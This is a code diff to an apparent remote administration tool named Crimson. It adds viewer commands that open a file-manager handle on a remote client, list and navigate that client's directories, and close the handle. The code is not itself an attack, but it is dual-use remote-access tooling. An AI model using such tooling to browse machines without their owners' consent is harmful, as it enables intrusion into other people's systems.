@@ -26,6 +26,9 @@ import org.slf4j.Logger;
 
 import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.proto.FileManager.FileListlet;
+import com.subterranean_security.crimson.core.proto.FileManager.MI_CloseFileHandle;
+import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileHandle;
+import com.subterranean_security.crimson.core.proto.FileManager.RQ_FileListing;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.proto.Generator.GenReport;
 import com.subterranean_security.crimson.core.proto.Generator.RQ_Generate;
@@ -118,7 +121,7 @@ public enum ViewerCommands {
 	public static boolean changeClientState(StringBuffer error, int cid, StateType st) {
 		log.debug("Changing client state: {}", st.toString());
 		try {
-			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setCid(cid)
+			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setRid(cid)
 					.setRqChangeServerState(RQ_ChangeServerState.newBuilder().setNewState(st)), 3);
 			if (m == null) {
 				error.append("No response");
@@ -242,14 +245,65 @@ public enum ViewerCommands {
 
 	}
 
-	public static enum FM {
-		;
-		public static ArrayList<FileListlet> down(String s, boolean mtime, boolean size) {
-			int id = IDGen.get();
-			ViewerRouter.route(Message.newBuilder().setId(id).build());
-			// TODO finish message sequence
-			return null;
+	public static int getFileHandle(int cid) {
+		try {
+			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setId(IDGen.get()).setRid(cid)
+					.setSid(Common.cvid).setRqFileHandle(RQ_FileHandle.newBuilder()), 2);
+			if (m != null) {
+				return m.getRsFileHandle().getFmid();
+			}
+
+		} catch (InterruptedException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
 		}
+		return 0;
+	}
+
+	public static void closeFileHandle(int cid, int fmid) {
+
+		ViewerRouter.route(
+				Message.newBuilder().setRid(cid).setMiCloseFileHandle(MI_CloseFileHandle.newBuilder().setFmid(fmid)));
+
+	}
+
+	public static ArrayList<FileListlet> fm_down(int cid, int fmid, String name, boolean mtime, boolean size) {
+		ArrayList<FileListlet> list = new ArrayList<FileListlet>();
+		try {
+			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setId(IDGen.get()).setRid(cid)
+					.setSid(Common.cvid).setRqFileListing(RQ_FileListing.newBuilder().setDown(name).setFmid(fmid)), 2);
+			list.addAll(m.getRsFileListing().getListingList());
+		} catch (InterruptedException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		return list;
+	}
+
+	public static ArrayList<FileListlet> fm_up(int cid, int fmid, boolean mtime, boolean size) {
+		ArrayList<FileListlet> list = new ArrayList<FileListlet>();
+		try {
+			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setId(IDGen.get()).setRid(cid)
+					.setSid(Common.cvid).setRqFileListing(RQ_FileListing.newBuilder().setUp(true).setFmid(fmid)), 2);
+			list.addAll(m.getRsFileListing().getListingList());
+		} catch (InterruptedException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		return list;
+	}
+
+	public static ArrayList<FileListlet> fm_list(int cid, int fmid, boolean mtime, boolean size) {
+		ArrayList<FileListlet> list = new ArrayList<FileListlet>();
+		try {
+			Message m = ViewerRouter.routeAndWait(Message.newBuilder().setId(IDGen.get()).setRid(cid)
+					.setSid(Common.cvid).setRqFileListing(RQ_FileListing.newBuilder().setFmid(fmid)), 2);
+			list.addAll(m.getRsFileListing().getListingList());
+		} catch (InterruptedException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		return list;
 	}
 
 }
